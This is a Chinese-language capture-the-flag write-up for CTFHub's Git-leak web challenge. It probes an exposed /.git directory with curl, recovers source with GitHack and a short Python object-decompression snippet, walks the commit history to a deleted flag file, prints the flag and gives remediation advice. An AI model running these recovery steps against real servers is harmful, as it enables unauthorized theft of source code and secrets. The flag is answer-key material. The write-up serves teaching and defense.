CTFHub - Web - 信息泄露 - Git泄露

# CTFHub # Web # 信息泄露 # Git # GitHack

一、题目信息

  • 题目名称：Git泄露
  • 题目方向：Web - 信息泄露
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目提示：开发人员使用 Git 对站点进行版本控制；如果部署配置不当，线上的 .git 目录可能被直接公开。
  • 题目目标：通过泄露的 Git 仓库恢复源码和历史提交，定位被删除或隐藏的 Flag。

二、漏洞原理

使用 Git 管理的 Web 项目，其仓库根目录下会存在 .git 目录。该目录保存对象数据库、引用、配置和提交历史。如果部署时直接将整个项目目录复制到 Web 根目录，且服务器没有拦截以点开头的目录，攻击者就可能访问 /.git/ 下的文件。

Git 对象通常以 loose object 形式保存在 .git/objects/ab/cdef... 中。得到对象后可以还原提交、目录树和文件内容。更关键的是，即使 flag 已从当前版本删除，它仍可能保留在历史提交对象中。

三、解题工具

  • 浏览器或 cURL：探测 .git 暴露情况。
  • GitHack：自动化恢复常见 Git 源码泄露。
  • Python：在没有 Git smart HTTP 的情况下，按对象哈希递归下载并解压 loose object。
  • Git：查看提交历史、目录树和不同版本之间的差异。

四、解题步骤

  1. 确认 .git 泄露：访问 /.git/HEAD，服务器返回 200 OK，内容指向 refs/heads/master： 
    curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/HEAD"

HTTP/1.1 200 OK
ref: refs/heads/master
  2. 读取仓库配置和 HEAD 提交：继续访问配置文件和 master 引用： 
    curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/config"
curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/heads/master"
    本次环境的 master 提交为： 
    b3b0922230123bfb58b470cb0cc32b3a4824ce32
  3. 判断恢复方式：请求 Git smart HTTP 的引用接口时返回 404 Not Found： 
    curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/info/refs?service=git-upload-pack"
    因此无法直接使用 git clone。可以尝试使用 BugScanTeam 的 GitHack： 
    git clone https://github.com/BugScanTeam/GitHack.git
python GitHack.py http://challenge-xxx.sandbox.ctfhub.com:10800/.git/
    当服务端只暴露 loose object 时，也可以按提交、目录树、文件对象的引用关系手动递归下载。
  4. 手动恢复 Git 对象：Git loose object 使用 zlib 压缩，原始内容格式为 类型 长度\0内容。根据对象的 SHA-1，可以从以下路径获取： 
    /.git/objects/<前2位>/<后38位>
    Python 解压对象的核心逻辑如下： 
    raw = urllib.request.urlopen(object_url).read()
body = zlib.decompress(raw)
header, payload = body.split(b"\x00", 1)
# header: b"commit 179", b"tree 42", b"blob 33", ...
    恢复时从 HEAD 指向的 commit 开始，读取其中的 tree；解析 tree 条目后继续递归获取子 tree 和 blob，最终可还原完整工作区。
  5. 检查历史提交：当前 HEAD 的 tree 中没有 flag。继续沿 commit 的 parent 字段回溯，共恢复出 3 个提交；flag 位于当前版本之前的提交中，并从最新版本删除了对应文件。 
    commit b3b0922230123bfb58b470cb0cc32b3a4824ce32
tree   012ae1fc6b838a345b689ae6bb4ec0edfd517a64

parent 4b44ae76c0d1...
tree   687865dde222321d7b514469e7056a1851473c1b
  6. 读取恢复出的文件：中间版本恢复出 flag 文件 21632082326844.txt，内容如下： 
    cat 21632082326844.txt
ctfhub{538c24e1183f417dc4b3684b}
提示：GitHack 能处理多数目录索引和 loose object 泄露场景；若目标禁用了 Git smart HTTP 且只开放单个对象文件，可参考本题的手动对象解析方式。

五、最终 Flag

ctfhub{538c24e1183f417dc4b3684b}

六、修复建议

  • 禁止 Web 服务器访问 .git、.svn、.hg 等版本控制目录。
  • 部署流水线只发布构建产物，不要将开发仓库或完整源码目录直接暴露到 Web 根目录。
  • 使用 Nginx 或 Apache 显式拦截以点开头的隐藏文件和敏感路径。
  • 若密钥、密码或 flag 曾进入 Git 历史，仅删除当前文件并不安全，应立即轮换相关凭据并清理历史对象。
  • 上线前使用目录扫描和安全检查验证 /.git/HEAD、/.git/config 等路径不可访问。

七、解题总结

本题的核心是识别 .git 目录泄露，并从 Git 历史而非当前页面中寻找 Flag。虽然 HEAD 对应的最新版本已经删除 flag 文件，但历史提交仍保留了 tree 和 blob 对象，通过恢复提交链和文件对象即可获得完整 Flag。
